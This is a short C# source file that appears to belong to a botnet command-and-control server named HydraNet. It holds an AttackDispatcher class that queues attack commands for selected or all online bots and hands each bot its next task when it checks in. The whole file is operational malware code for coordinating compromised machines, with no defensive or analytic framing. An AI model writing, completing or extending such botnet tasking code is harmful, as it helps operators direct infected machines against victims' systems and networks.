namespace HydraNet.C2.Server;

using System.Collections.Concurrent;
using HydraNet.C2.Models;

public sealed class AttackDispatcher
{
    private readonly BotManager _botManager;
    private readonly ConcurrentDictionary<string, Queue<AttackCommand>> _taskQueues = new();

    public AttackDispatcher(BotManager botManager)
    {
        _botManager = botManager;
    }

    public void Dispatch(AttackCommand command)
    {
        var targetBots = command.BotIds.Length > 0
            ? command.BotIds
            : _botManager.GetOnlineBotIds().ToArray();

        foreach (var botId in targetBots)
        {
            var queue = _taskQueues.GetOrAdd(botId, _ => new Queue<AttackCommand>());
            lock (queue)
            {
                queue.Enqueue(command);
            }
        }
    }

    public AttackCommand? GetPendingTask(string botId)
    {
        _botManager.UpdateLastSeen(botId);

        if (_taskQueues.TryGetValue(botId, out var queue))
        {
            lock (queue)
            {
                if (queue.Count > 0)
                {
                    return queue.Dequeue();
                }
            }
        }
        return null;
    }

    public int PendingCountFor(string botId)
    {
        if (_taskQueues.TryGetValue(botId, out var queue))
        {
            lock (queue)
            {
                return queue.Count;
            }
        }
        return 0;
    }
}
